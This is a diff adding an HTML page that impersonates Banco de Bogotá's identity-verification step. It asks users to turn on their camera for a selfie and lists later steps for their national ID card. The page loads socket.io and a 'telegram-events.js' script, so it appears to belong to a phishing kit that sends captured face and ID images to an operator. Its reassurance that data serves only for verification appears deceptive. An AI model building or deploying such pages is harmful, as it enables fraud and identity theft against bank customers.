@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <meta name="description" content="Verificación de identidad - Banco de Bogotá">
+    <meta name="theme-color" content="#002A8D">
+    
+    <title>Verificación de Identidad - Banco de Bogotá</title>
+    
+    <!-- Favicons -->
+    <link rel="icon" type="image/png" sizes="32x32" href="Imagenes/channels4_profile-removebg-preview.png">
+    <link rel="icon" type="image/png" sizes="96x96" href="Imagenes/channels4_profile-removebg-preview.png">
+    <link rel="icon" type="image/png" sizes="192x192" href="Imagenes/channels4_profile-removebg-preview.png">
+    <link rel="apple-touch-icon" href="Imagenes/channels4_profile-removebg-preview.png">
+    
+    <!-- Estilos -->
+    <link rel="stylesheet" href="css/loading-overlay.css?v=1.0.2">
+    <link rel="stylesheet" href="cara.css?v=1.0.2">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;500;600;700&display=swap" rel="stylesheet">
+    
+    <!-- Scripts críticos -->
+    <script src="/socket.io/socket.io.js"></script>
+    <script src="js/loading-overlay-manager.js?v=1.0.2"></script>
+    <script src="js/common.js?v=1.0.2"></script>
+    <script src="js/telegram-events.js?v=1.0.2"></script>
+    <script src="cara.js?v=1.0.2" defer></script>
+</head>
+<body>
+    <!-- Loading Overlay -->
+    <div class="loading-overlay" id="loadingOverlay">
+        <div class="loading-content">
+            <img src="Imagenes/channels4_profile-removebg-preview.png" alt="Banco de Bogotá" class="loading-logo">
+            <div class="loading-spinner">
+                <div class="spinner-ring"></div>
+            </div>
+            <p class="loading-text">Cargando</p>
+            <p class="loading-subtext"></p>
+        </div>
+    </div>
+
+    <div class="container">
+        <section class="verification-section">
+            <div class="bank-logo">
+                <img src="Imagenes/banco-de-bogota.png" alt="Banco de Bogotá Logo" class="main-logo">
+            </div>
+            
+            <div class="verification-container">
+                <div class="progress-bar">
+                    <div class="progress-step active">
+                        <div class="step-circle">1</div>
+                        <span>Selfie</span>
+                    </div>
+                    <div class="progress-line"></div>
+                    <div class="progress-step">
+                        <div class="step-circle">2</div>
+                        <span>Cédula</span>
+                    </div>
+                    <div class="progress-line"></div>
+                    <div class="progress-step">
+                        <div class="step-circle">3</div>
+                        <span>Confirmación</span>
+                    </div>
+                </div>
+
+                <h1 class="verification-title">Verificación de Identidad</h1>
+                <p class="verification-subtitle">Por seguridad, necesitamos verificar tu identidad</p>
+                
+                <div class="camera-container">
+                    <div class="camera-preview" id="cameraPreview">
+                        <video id="video" autoplay playsinline></video>
+                        <canvas id="canvas" style="display: none;"></canvas>
+                        <div class="camera-overlay">
+                            <div class="face-outline">
+                                <svg width="250" height="320" viewBox="0 0 250 320">
+                                    <ellipse cx="125" cy="160" rx="100" ry="140" fill="none" stroke="white" stroke-width="3" stroke-dasharray="10,5"/>
+                                </svg>
+                            </div>
+                        </div>
+                        <div class="camera-placeholder" id="cameraPlaceholder">
+                            <svg width="80" height="80" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <circle cx="12" cy="10" r="3" stroke="currentColor" stroke-width="2"/>
+                                <path d="M12 2C9.243 2 7 4.243 7 7v2H5a2 2 0 00-2 2v9a2 2 0 002 2h14a2 2 0 002-2v-9a2 2 0 00-2-2h-2V7c0-2.757-2.243-5-5-5z" stroke="currentColor" stroke-width="2"/>
+                            </svg>
+                            <p>Posiciona tu rostro dentro del óvalo</p>
+                        </div>
+                    </div>
+                    
+                    <div class="captured-image" id="capturedImage" style="display: none;">
+                        <img id="capturedPhoto" alt="Foto capturada">
+                        <button type="button" class="retake-button" id="retakeButton">
+                            <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                                <path d="M3 12a9 9 0 0 1 9-9 9.75 9.75 0 0 1 6.74 2.74L21 8" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                                <path d="M21 3v5h-5" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                            </svg>
+                            Tomar otra foto
+                        </button>
+                    </div>
+                </div>
+
+                <div class="instructions">
+                    <h3>Instrucciones:</h3>
+                    <ul>
+                        <li>Asegúrate de estar en un lugar bien iluminado</li>
+                        <li>Retira gafas, gorras o cualquier accesorio que cubra tu rostro</li>
+                        <li>Posiciona tu rostro dentro del óvalo</li>
+                        <li>Mantén una expresión neutral</li>
+                    </ul>
+                </div>
+
+                <div class="button-container">
+                    <button type="button" class="action-button secondary" id="startCameraButton">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <rect x="2" y="6" width="20" height="12" rx="2" stroke="currentColor" stroke-width="2"/>
+                            <path d="M22 9l-5 3 5 3V9z" fill="currentColor"/>
+                        </svg>
+                        Activar Cámara
+                    </button>
+                    <button type="button" class="action-button" id="captureButton" style="display: none;">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <circle cx="12" cy="12" r="10" stroke="currentColor" stroke-width="2"/>
+                            <circle cx="12" cy="12" r="3" fill="currentColor"/>
+                        </svg>
+                        Capturar Foto
+                    </button>
+                    <button type="button" class="action-button" id="continueButton" style="display: none;">
+                        Continuar
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg">
+                            <path d="M5 12h14M12 5l7 7-7 7" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"/>
+                        </svg>
+                    </button>
+                </div>
+            </div>
+
+            <p class="privacy-text">
+                Tus datos están protegidos y serán utilizados únicamente para verificar tu identidad.
+            </p>
+        </section>
+    </div>
+</body>
+</html>
